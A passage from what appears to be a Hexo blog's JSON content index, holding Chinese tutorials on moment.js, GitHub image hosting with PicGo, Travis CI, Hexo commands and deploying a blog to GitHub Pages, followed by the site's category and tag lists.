快速上手momentjs支持多个环境，所有的代码都应该在这两种环境中都可以工作。 Node.js12npm install momentvar moment &#x3D; require(&#39;moment&#39;); 浏览器1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt; 实例获取当前的日期和时间： 创建1moment(); 相当于moment(new Date()) 此处会返回一个moment封装的日期对象。 格式化1234567moment().format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020年07月07日 07:49:38&quot;moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;moment().format(&#39;d&#39;) &#x2F;&#x2F; 2，今天是周二moment().format(&#39;X&#39;) &#x2F;&#x2F; 获取当前时间的Unix时间戳 转换为Date对象1234moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (中国标准时间)moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (中国标准时间)moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (中国标准时间)moment(1448896064621).toDate() &#x2F;&#x2F;毫秒转日期 获取时间信息123456789moment().second() &#x2F;&#x2F; 获取当前这一分钟的多少秒moment().date() &#x2F;&#x2F; 获取天moment().day() &#x2F;&#x2F; 获取星期moment().dayOfYear() &#x2F;&#x2F; 一年内的多少天moment().week() &#x2F;&#x2F; 一年里的多少周moment().month() &#x2F;&#x2F; 获取当前月份（实际月份-1）moment().quarter() &#x2F;&#x2F; 一年内的第几个季度moment().year() &#x2F;&#x2F; 获取年份moment().daysInMonth() &#x2F;&#x2F; 获取当月天数 显示一旦解析和操作完成后，需要某些方式来显示 moment。 使用format来格式化日期： 123456moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; 将Unix 时间戳转换为日期格式moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; 将Unix 毫秒时间戳转换为日期格式moment().unix(); &#x2F;&#x2F; 获取Unix 时间戳moment().format(&quot;X&quot;); &#x2F;&#x2F; 获取Unix 时间戳moment().format(&quot;x&quot;); &#x2F;&#x2F; 获取Unix 毫秒时间戳","categories":[{"name":"前端","slug":"前端","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]},{"title":"如何选择一个适合自己的图床","slug":"how-to-choose-a-picture-bed-that-suits-you","date":"2020-07-06T15:06:33.000Z","updated":"2020-07-10T05:36:37.965Z","comments":true,"path":"how-to-choose-a-picture-bed-that-suits-you/","link":"","permalink":"https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/","excerpt":"因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。 如果不是因为SM.MS 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。 于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。 使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。","text":"因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。 如果不是因为SM.MS 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。 于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。 使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。 为什么不选择国内的那些图床服务？ 我只是想存一些图片，而国内的大部分图床服务，还需要做域名备案以及绑定各种服务，感觉很繁琐，加上我的域名不是在国内的域名服务商那里买的，索性就没有考虑国内的图床服务。 图床管理工具有了图床，就需要顺手配置一个图床管理工具，这里我选择的是 PicGo，仅目前支持的图床就有：SM.MS图床，微博图床，七牛图床，腾讯云COS，阿里云OSS，Imgur，又拍云，GitHub 图床等。 创建GitHub 图床首先，你得有一个GitHub 账号。 1. 新建一个仓库这个仓库是用于存储图片，最好是public，因为private的仓库，图片链接会带token，而这个token会存在过期的问题。 2. 获取授权token通过Settings-&gt;Developer settings-&gt;Personal access tokens 创建一个新的token 用于PicGo操作你的仓库。 把repo的勾打上即可，点击Generate token的绿色按钮生成 token。 创建成功后，会生成一串token，这串token之后不会再显示，所以第一次看到的时候最好保存好。 配置PicGoGitHub 图床的配置还是比较简单的，下面是参数说明。 仓库名：你的图床仓库的名称，格式为：username/repository 分支名：一般选择默认分支 master Token：刚才生成的 Token 存储路径：指定存放在仓库的哪个目录下 自定义域名：raw.githubusercontent.com/username/repository/branch 自定义域名最好按照一定的规则去定义：raw.githubusercontent.com+你的github用户名+仓库名称+分支名称 raw.githubusercontent.com 是github用来存储用户上传文件的服务地址，是github 的素材服务器 (assets server)。 通常配置完成之后，就可以直接使用了。 如果你上传失败的情况，可以打开PicGo 的日志看看具体是什么异常 如果得到了这样的异常，那么大概率是因为你没有开启全局代理。 1[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96; 因为GitHub 服务器和国内 GFW 的问题会导致有时上传成功，有时上传失败，所以需要自备好科学上网工具。 如果你还有其他问题，可以查阅 PicGo FAQ。 总结 如果你和我一样，讨厌域名备案，又希望能有一个免费、稳定的图床，那么一定不要错过GitHub 图床。 如果你只是需要存储一些不怎么重要的图片，那么可以使用免费不限大小的SM.MS图床。 如果打算长期稳定使用可以优先选择又拍云或者七牛云。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"Travis CI 快速上手","slug":"travis-ci-quick-start","date":"2020-07-05T06:25:58.000Z","updated":"2020-07-09T13:12:54.040Z","comments":true,"path":"travis-ci-quick-start/","link":"","permalink":"https://www.0x2beace.com/travis-ci-quick-start/","excerpt":"最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。 它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。 其中最出名大概就是Travis CI了，本文的目的就是快速入门 Travis CI。","text":"最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。 它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。 其中最出名大概就是Travis CI了，本文的目的就是快速入门 Travis CI。 什么是持续集成？持续集成(Continuous Integration)是对小周期的的代码进行更改，其目的是通过以较小的增量开发和测试来构建更健康的软件。 而Travis CI 作为一个持续集成平台，通过自动构建和测试代码，并提供更改成功的即时反馈。 快速上手在正式开始之前，需要提前准备好以下先决条件： 一个 GitHub 帐户 托管在 Github 的项目的所有者权限 需要注意的是：Travis CI不是完全免费的服务，前100个私有构建是免费的，后续就要进行付费，如果你的项目是开源的，或者你是学生，则不受限制。 在Github 上使用Travis CI 将 Travis CI 添加到你的 GitHub 账户中。 前往 GitHub 的 Applications settings，配置 Travis CI 权限，使其能够访问你的 repository。 前往 GitHub 新建 Personal Access Token，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。 回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。 在你的项目中新建一个 .travis.yml 文件。 提交并推送以触发Travis CI构建。 其中.travis.yml文件的目的是告诉 Travis CI 应该做些什么。 以下示例指定了应使用Ruby 2.2和最新版本的JRuby构建的Ruby项目。 1234language: rubyrvm: - 2.2 - jruby 通过访问Travis CI 并选择repository，检查构建状态页面，以根据构建命令的返回状态查看构建是否通过或失败。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"}]},{"title":"Hexo 快速上手","slug":"hexo-quick-start","date":"2020-07-05T06:16:31.000Z","updated":"2020-08-15T01:05:05.993Z","comments":true,"path":"hexo-quick-start/","link":"","permalink":"https://www.0x2beace.com/hexo-quick-start/","excerpt":"最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。","text":"最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。 常用命令init新建一个网站。如果没有设置 folder，Hexo 默认在目前的文件夹建立网站。 1$ hexo init [folder] newlayout 有三种选择： post：新建一片文章 page：新建一个页面 draft：新建一篇草稿 如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 1$ hexo new [layout] &lt;title&gt; generate生成静态文件。 12$ hexo generate&#x2F;&#x2F; 等效于 hexo g 常用参数：|选项|描述||-|-||-d, –deploy|文件生成后立即部署网站||-w, –watch|监视文件变动||-b, –bail|生成过程中如果发生任何未处理的异常则抛出异常| publish发表草稿 1$ hexo publish [layout] &lt;filename&gt; server启动服务器。默认情况下，访问网址为： http://localhost:4000/。 12$ hexo server&#x2F;&#x2F; 等效于 hexo s deploy部署网站。 12$ hexo deploy&#x2F;&#x2F; 等效于 hexo d -g，--generate：部署之前预先生成静态文件 clean清除缓存文件 (db.json) 和已生成的静态文件 (public)。 在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，那可能需要运行该命令。 1$ hexo clean list列出网站资料。 1$ hexo list version显示 Hexo 版本。 1$ hexo version 其他模式安全模式在安全模式下，不会载入插件和脚本。当需要安装新插件遭遇问题时，可以尝试以安全模式重新执行。 1$ hexo --safe 调试模式在终端中显示调试信息并记录到 debug.log。 1$ hexo --debug 显示草稿显示 source/_drafts 文件夹中的草稿文章。 1$ hexo --draft 常见问题CNAME 文件被删除GitHub Pages 为我们免费提供了&lt;username&gt;.github.io这样的域名作为 GitHub Page，但如果你觉得这个域名太长了，不满意，那么你也可以绑定自己的域名。 通常绑定完成之后，会在项目目录下面生成一个叫做CNAME的文件，这个文件的作用就是用来记录GitHub Pages 所绑定的域名。 这个时候就会产生一个问题： CNAME文件会在每次 hexo deploy 时消失，然后需要重新手动绑定，这样就很繁琐。 有以下几种方式可以解决这个问题： 每次 hexo d 之后，就去 GitHub 仓库根目录新建 CNAME文件。—— 繁琐 在 hexo g 之后， hexo d 之前，把CNAME文件复制到 public 目录下面，里面写入你要绑定的域名。—— 繁琐 将需要上传至 GitHub 的内容放在source文件夹，例如CNAME、favicon.ico、images等，这样在 hexo d 之后就不会被删除了。 通过安装插件实现永久保留。 1$ npm install hexo-generator-cname --save 编辑_config.yml 12Plugins:- hexo-generator-cname 推荐第三种方式，简单方便。 配置apex 域Github Pages 是支持绑定自己的私有域名的，但默认只能绑定 CNAME的私有子域名，那有没有办法主域名呢？ 答案是有的。 如果绑定主域名，例如 example.com，建议还设置一个 www 子域，GitHub Pages 将自动在域之间创建重定向，当输入example.com时，会重定向到 www.example.com。 通常我们绑定好私有子域名之后，回生成一个CNAME的文件，里面记录着我们绑定好的私有子域名。 此时只需要去DNS 做解析，创建一个ALIAS、ANAME 或 A 记录： 创建ALIAS、ANAME记录：将 apex 域指向站点的默认域。 创建A 记录：将 apex 域指向 GitHub Pages 的 IP 地址。 12345&#x2F;&#x2F; GitHub Pages 的 IP 地址185.199.108.153185.199.109.153185.199.110.153185.199.111.153 这里我选择的是创建A 记录，所以我的DNS 解析是这样的： 配置完DNS 解析之后，可以使用dig命令来检验是否解析成功： 12345678$ dig example.com +noall +answer; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer;; global options: +cmd0x2BeAce.com. 4502 IN A 185.199.111.1530x2BeAce.com. 4502 IN A 185.199.110.1530x2BeAce.com. 4502 IN A 185.199.108.1530x2BeAce.com. 4502 IN A 185.199.109.153 将example.com 替换成你自己的 apex 域，确认结果与上面 GitHub Pages 的 IP 地址相匹配。 至此，就完成了apex 域的配置了。 参考链接 github+hexo搭建自己的博客网站（七）注意事项 Hexo | 指令 管理 GitHub Pages 站点的自定义域","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Github Pages 部署 Hexo 个人博客","slug":"deploy-hexo-using-github-pages-personal-blog","date":"2020-07-04T12:09:09.000Z","updated":"2020-08-15T01:11:07.291Z","comments":true,"path":"deploy-hexo-using-github-pages-personal-blog/","link":"","permalink":"https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/","excerpt":"关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。 这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。","text":"关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。 这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。 为什么使用Github Pages？ 我是出于以下原因考虑的： 暂时没有服务器的需要，我只想有一个能写博客的地方。 GitHub Pages 可以提供 https服务，我不用担心域名备案的问题。 免费 总之，如果你想用最简单、最省心的方式，搭建属于自己的博客，那么 Github Pages 一定不会让你失望。 系统环境 Mac OS 10.15.4 Node.js 12 Hexo-cli: 3.1 NPM: 6.9 创建Github PagesGithub Pages分为两类，用户或组织主页、项目主页。 用户或组织主页：在新建仓库时，仓库名称应该以&lt;yourusername&gt;.github.io的格式去填写。&lt;yourusername&gt;指的是你的Github 的用户名称。 创建项目主页：在新建仓库时，名称可以任意设置，然后通过Setting-&gt;Options-&gt;Github Pages将 Source选项设置为Master Branch，此时这个项目就变成一个 Github Pages项目了。 需要注意的是： Github Pages 只针对开源的项目是免费的，如果你不想开源，那可能就需要考虑收费的套餐了。 第一种方式不能更改 Github Pages 部署分支。 如果你有自己的域名，那么推荐使用方式二创建 Github Pages。如果你没有自己的域名，那也没有关系，可以使用Github Pages 提供的域名访问http://&lt;yourusername&gt;.github.io。 绑定域名如果你是通过方式一，创建的Github Pages，那么可以跳过此部分。 在 2018 年 5 月 1 日之后，GitHub Pages 已经开始提供免费为自定义域名开启 HTTPS 的功能，并且大大简化了操作的流程，现在用户已经不再需要自己提供证书，只需要将自己的域名使用 CNAME 的方式指向自己的 GitHub Pages 域名即可。 首先需要在你的 DNS 解析里添加一条解析记录，例如我选择添加子域名blog.aikang.me，通过 CNAME 的方式指向我刚刚自定义的 GitHub Pages 域名 0xAiKang.github.io。 添加完成后等待 DNS 解析的生效的同时回到项目的Setting界面，将刚才的子域名与 Github Pages 绑定在一起。 保存之后，我们只需要耐心等待 GitHub 生成证书并确认域名的解析是否正常。 将Hexo 部署到Github Pages域名解析成功之后，就可以通过我们刚才绑定的域名进行访问了，但是你会发现，现在只能看到一片空白，这是因为我们的网站还没有任何内容，所以下一步需要做的就是选择一套静态模版系统。 目前市场上有很多优秀的静态模板系统，比如： Node.js 编写的 Hexo Go 编写的 Hugo Python 编写的 Pelican 静态博客写作客户端 Gridea 为什么要选择Hexo？ 最初在选择博客模版系统时，并没有发现 Gridea ，事后发现这个小众的静态博客写作客户端似乎才是我真正想要的。 不过既然选择了Hexo，也是因为它的生态环境很大，可选主题非常多，并且都是开源的。 如何将 Hexo 部署到 GitHub Pages？ 将 Travis CI 添加到你的 GitHub 账户中。 前往 GitHub 的 Applications settings，配置 Travis CI 权限，使其能够访问你的 repository。 正常情况下你会被重定向到 Travis CI 的页面。如果没有，请 手动前往。 前往 GitHub 新建 Personal Access Token，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。 回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。 在你的 Hexo 站点文件夹中新建一个 .travis.yml 文件： 123456789101112131415161718sudo: falselanguage: node_jsnode_js: - 10 # use nodejs v10 LTScache: npmbranches: only: - master # build master branch onlyscript: - hexo generate # generate static filesdeploy: provider: pages skip-cleanup: true github-token: $GH_TOKEN keep-history: true on: branch: master local-dir: public 上面这个配置文件的作用是用来自动构建，编译测试。 将 .travis.yml 推送到 repository 中。Travis CI 会自动开始运行，并将生成的文件推送到同一 repository 下的 gh-pages 分支下。 修改发布源推送完成之后，会发现多了一个 gh-gages分支，这个分支就是用于部署站点的分支，但是GitHub Pages 会默认使用master分支作为发布源，所以我们需要切换发布源。 在Setting-&gt;Option-&gt;GitHub Pages下，使用 Source（源）下拉菜单选择发布源。 注意：使用用户或组织主页构建的 Github Pages 不能修改发布源，只能使用默认的 master分支。 一键部署Hexo 提供了快速方便的一键部署功能，让你只需一条命令就能将网站部署到服务器上。 在正式部署之前，我们需要先修改_config.yml 文件，配置参数。 12345deploy: type: git repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io branch: [branch] message: [message] 参数 描述 默认值 type deployer - repo 项目地址 - branch 分支名称 gh-pages 有以下两点需要注意：1.repo 需要选择SSH 协议，HTTPS协议会报错。2.branch 选择Github Pages中设置的那个分支，而不是拉取这个项目的分支 我这里使用的是git 作为 deployer，所以需要手动安装一个插件。 1npm install hexo-deployer-git --save 生成站点文件并部署至远程库： 1hexo clean &amp;&amp; hexo deploy --generate 至此，就完成了使用Github Pages 部署 Hexo 个人博客的全部过程，总的来说还是很顺利的。 参考链接 Github Pages 搭建教程 将Hexo 部署到 GitHub Pages Hexo 一键部署 Github Pages部署个人博客（Hexo篇）","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]}],"categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/categories/Jenkins/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/categories/Hexo/"},{"name":"一些思考","slug":"PHP/Laravel/一些思考","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"一些思考","slug":"PHP/一些思考","permalink":"https://www.0x2beace.com/categories/PHP/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"Ubuntu","slug":"Linux/Ubuntu","permalink":"https://www.0x2beace.com/categories/Linux/Ubuntu/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"},{"name":"Skill","slug":"Mac/Skill","permalink":"https://www.0x2beace.com/categories/Mac/Skill/"},{"name":"运维","slug":"运维","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Jenkins","slug":"运维/Jenkins","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/Jenkins/"},{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"Redis","slug":"PHP/Redis","permalink":"https://www.0x2beace.com/categories/PHP/Redis/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Mac","slug":"Tutorial/Mac","permalink":"https://www.0x2beace.com/categories/Tutorial/Mac/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"},{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"},{"name":"年终总结","slug":"年终总结","permalink":"https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"},{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"},{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"进程管理","slug":"PHP/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"},{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"进程管理","slug":"Node/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"},{"name":"前端","slug":"前端","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"https://www.0x2beace.com/tags/Centos/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"},{"name":"域名","slug":"域名","permalink":"https://www.0x2beace.com/tags/%E5%9F%9F%E5%90%8D/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"},{"name":"一些思考","slug":"一些思考","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"运维","slug":"运维","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"},{"name":"CD","slug":"CD","permalink":"https://www.0x2beace.com/tags/CD/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"https://www.0x2beace.com/tags/ThinkPHP/"},{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"面试","slug":"面试","permalink":"https://www.0x2beace.com/tags/%E9%9D%A2%E8%AF%95/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"},{"name":"年终总结","slug":"年终总结","permalink":"https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"},{"name":"Composer","slug":"Composer","permalink":"https://www.0x2beace.com/tags/Composer/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"},{"name":"防火墙","slug":"防火墙","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"UFW","slug":"UFW","permalink":"https://www.0x2beace.com/tags/UFW/"},{"name":"iptables","slug":"iptables","permalink":"https://www.0x2beace.com/tags/iptables/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"},{"name":"持久化","slug":"持久化","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"},{"name":"进程","slug":"进程","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"},{"name":"Ngin